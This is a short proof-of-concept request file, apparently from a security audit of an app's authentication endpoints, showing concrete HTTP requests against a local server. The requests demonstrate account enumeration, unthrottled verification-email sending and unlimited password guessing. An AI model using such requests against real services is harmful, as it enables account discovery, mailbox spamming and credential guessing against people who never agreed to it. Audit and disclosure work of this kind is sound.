### PoC #4 — Account enumeration + unauthenticated email-send abuse
### Use with VS Code "REST Client" or IntelliJ .http runner. Server assumed at :5080.
### EXECUTION STATUS: NOT executed here (no running server). Requests are concrete.

### (a) Enumerate: a REGISTERED gmail returns {"error":"email_taken"} (HTTP 400)
# Source: AuthController.cs:50-51 (send-code) and AuthController.cs:83-84 (register).
# This distinguishes registered vs non-registered accounts -> user enumeration.
POST http://localhost:5080/api/auth/send-code
Content-Type: application/json

{ "email": "known-registered@gmail.com", "nickname": "x" }

### (b) A NON-registered gmail returns 200 OK (and an email is actually sent).
# No CAPTCHA, no auth, no rate limit (no rate limiter anywhere in Program.cs) ->
# this endpoint is an open email-sending / mailbox-spam gun once SMTP is configured,
# and an enumeration oracle regardless.
POST http://localhost:5080/api/auth/send-code
Content-Type: application/json

{ "email": "fresh-target@gmail.com", "nickname": "x" }

### (c) Login oracle is SAFE by comparison: always generic invalid_credentials.
# Source: AuthController.cs:124-125. (Shown for contrast — not a finding.)
POST http://localhost:5080/api/auth/login
Content-Type: application/json

{ "email": "known-registered@gmail.com", "password": "wrong" }

### (d) No rate limit on login => offline-speed only limited by bcrypt. Repeat freely.
POST http://localhost:5080/api/auth/login
Content-Type: application/json

{ "email": "known-registered@gmail.com", "password": "guess1" }
